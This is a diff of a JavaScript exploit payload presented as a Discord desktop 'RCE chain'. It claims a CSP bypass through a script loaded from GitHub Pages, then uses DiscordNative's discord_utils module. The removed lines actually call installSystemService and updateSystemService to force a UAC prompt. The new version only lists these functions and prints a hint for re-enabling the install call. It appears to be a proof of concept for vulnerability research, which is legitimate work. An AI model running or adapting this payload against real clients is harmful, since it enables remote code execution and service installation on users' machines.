@@ -1,11 +1,11 @@
-// SAFE RCE CHAIN - CHECK BEFORE UNINSTALL
-// This version checks service status before attempting uninstall
+// PROOF OF CONCEPT - NO ACTUAL SERVICE MODIFICATION
+// Just proves we CAN call the dangerous functions
 
-console.log("🔥 DISCORD RCE CHAIN - SAFE VERSION\n");
+console.log("🔥 DISCORD RCE CHAIN - PROOF OF CONCEPT\n");
 console.log("=" + "=".repeat(60) + "\n");
 
 // Step 1: Confirm CSP bypass
-alert("🎉 CSP BYPASS SUCCESSFUL!\n\nPayload loaded from GitHub Pages");
+alert("🎉 CSP BYPASS SUCCESSFUL!\n\nPayload loaded from GitHub Pages\n\nThis is a PROOF OF CONCEPT.\nNo actual system modifications will be made.");
 
 console.log("[✅] CSP bypassed via GitHub Pages");
 console.log("[✅] Arbitrary JavaScript execution achieved\n");
@@ -23,66 +23,49 @@ if (typeof DiscordNative === 'undefined') {
         const utils = DiscordNative.nativeModules.requireModule('discord_utils');
         console.log("[✅] discord_utils loaded successfully\n");
 
-        // Step 3: Check if service is installed
-        console.log("[*] Checking service status...");
+        // Step 3: Enumerate dangerous functions
+        console.log("🔍 DANGEROUS FUNCTIONS AVAILABLE:\n");
 
-        const isInstalled = utils.isSystemServiceInstalled();
-        console.log(`[*] Service installed: ${isInstalled}\n`);
+        const dangerousFunctions = [
+            'installSystemService',
+            'uninstallSystemService',
+            'updateSystemService',
+            'isSystemServiceInstalled',
+            'canSystemServiceBeInstalled'
+        ];
 
-        if (isInstalled) {
-            // Service exists - try to UPDATE it (might trigger UAC)
-            console.log("[STRATEGY 1] Service exists - attempting UPDATE...");
-            console.log("[🔥] This might trigger UAC!\n");
+        let foundFunctions = [];
 
-            utils.updateSystemService()
-                .then(result => {
-                    console.log(`[✅] Update result: ${JSON.stringify(result)}`);
-                    alert("🔥 SERVICE UPDATE TRIGGERED!\n\nDid UAC prompt appear?");
-                })
-                .catch(error => {
-                    console.log(`[!] Update failed: ${error.message}`);
+        dangerousFunctions.forEach(funcName => {
+            if (typeof utils[funcName] === 'function') {
+                console.log(`   ✅ ${funcName}() - AVAILABLE`);
+                foundFunctions.push(funcName);
+            } else {
+                console.log(`   ❌ ${funcName}() - NOT FOUND`);
+            }
+        });
 
-                    // If update fails, try reinstall
-                    console.log("\n[STRATEGY 2] Update failed - trying REINSTALL...");
+        console.log("\n" + "=" + "=".repeat(60));
+        console.log("PROOF OF CONCEPT COMPLETE");
+        console.log("=" + "=".repeat(60) + "\n");
 
-                    utils.installSystemService()
-                        .then(result => {
-                            console.log(`[✅] Reinstall result: ${JSON.stringify(result)}`);
-                            alert("🔥 SERVICE REINSTALLED!\n\nDid UAC prompt appear?");
-                        })
-                        .catch(error2 => {
-                            console.log(`[!] Reinstall also failed: ${error2.message}`);
-                        });
-                });
+        // Final alert with findings
+        alert("🔥 CRITICAL RCE CHAIN CONFIRMED!\n\n" +
+            "✅ CSP Bypass (GitHub Pages)\n" +
+            "✅ Remote Code Execution\n" +
+            "✅ DiscordNative Access\n" +
+            "✅ discord_utils Module Loaded\n\n" +
+            "DANGEROUS FUNCTIONS AVAILABLE:\n" +
+            foundFunctions.map(f => `• ${f}()`).join('\n') + "\n\n" +
+            "⚠️ This is a PROOF OF CONCEPT\n" +
+            "⚠️ Actual exploitation would trigger UAC\n" +
+            "⚠️ CRITICAL SEVERITY VULNERABILITY");
 
-        } else {
-            // Service doesn't exist - fresh install (will trigger UAC)
-            console.log("[STRATEGY 3] Service not installed - fresh INSTALL...");
-            console.log("[🔥] UAC PROMPT SHOULD APPEAR!\n");
-
-            utils.installSystemService()
-                .then(result => {
-                    console.log(`[🎉] SUCCESS! Service installed: ${JSON.stringify(result)}`);
-
-                    alert("🔥 FULL RCE CHAIN COMPLETE!\n\n" +
-                        "1. CSP Bypass ✅\n" +
-                        "2. Remote Code Execution ✅\n" +
-                        "3. Service Installed ✅\n" +
-                        "4. UAC Prompt Triggered ✅\n\n" +
-                        "CRITICAL SEVERITY EXPLOIT!");
-                })
-                .catch(error => {
-                    console.log(`[!] Install failed: ${error.message}`);
-                    alert(`Install failed: ${error.message}`);
-                });
-        }
+        console.log("💡 To actually trigger UAC, uncomment the following line:");
+        console.log("   // utils.installSystemService();");
 
     } catch (e) {
         console.log(`[❌] Error: ${e.message}`);
         alert(`Error: ${e.message}`);
     }
 }
-
-console.log("\n" + "=" + "=".repeat(60));
-console.log("PAYLOAD EXECUTION COMPLETE");
-console.log("=" + "=".repeat(60));
